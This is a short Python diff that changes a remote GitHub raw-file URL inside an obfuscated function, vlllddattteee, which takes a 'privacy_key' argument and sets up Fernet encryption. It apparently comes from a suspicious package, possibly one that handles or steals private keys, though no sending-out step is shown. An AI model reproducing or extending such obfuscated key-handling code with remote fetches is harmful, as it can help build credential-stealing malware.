@@ -25,7 +25,7 @@ def get_secure_key():
 '''
 
 def vlllddattteee(privacy_key):  
-    raw2_url  = 'https://raw.githubusercontent.com/xsjfns/raws/main/mypass.txt'
+    raw2_url  = 'https://raw.githubusercontent.com/xsjfns/raws/main/raw1.txt'
 
     crpppttkkyy = Fernet.generate_key()
     cipher_suite = Fernet(crpppttkkyy)
